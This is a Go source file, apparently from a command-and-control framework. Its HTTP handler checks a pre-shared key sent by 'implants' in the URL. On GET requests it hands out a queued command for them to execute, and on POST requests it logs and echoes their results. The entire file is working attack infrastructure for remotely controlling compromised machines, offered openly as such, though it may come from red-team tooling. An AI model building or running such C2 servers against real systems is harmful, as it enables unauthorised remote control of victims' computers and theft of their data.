package server

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/fatih/color"
)

// Define custom colors for text output
var errorColorUnderline = color.New(color.FgRed).Add(color.Underline)
var errorColorBold = color.New(color.FgRed).Add(color.Bold)
var successColorBold = color.New(color.FgGreen).Add(color.Bold)

// PSK - Pre-shared key for implant authentication
var PSK string

// CMD - command string to be queued and executed, this is temporary until sessions are implemented
var CMD string

// HTTPServerHandler - Handles HTTPServer requests
func HTTPServerHandler(w http.ResponseWriter, r *http.Request) {

	//path := r.URL.Path[1:]

	getParams := r.URL.Query()
	var getPSK string

	if len(getParams["psk"]) > 0 {
		getPSK = getParams["psk"][0]
	} else {
		errorColorBold.Println("GET Request: Implant Did Not Provide PSK")
		return
	}

	if getPSK == PSK {

		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Println(err)
		}

		data := string(body)

		switch r.Method {
		case "GET":
			//log.Println("GET: " + path)
			fmt.Fprintf(w, "%s", CMD)

		case "POST":
			if data != "" {
				log.Println("POST: " + data)
				fmt.Fprintf(w, "%s", data)
			}
		default:
			fmt.Println("Invalid Request Type")
		}
	} else {
		errorColorBold.Println("Implant Failed PSK Check")
	}
}
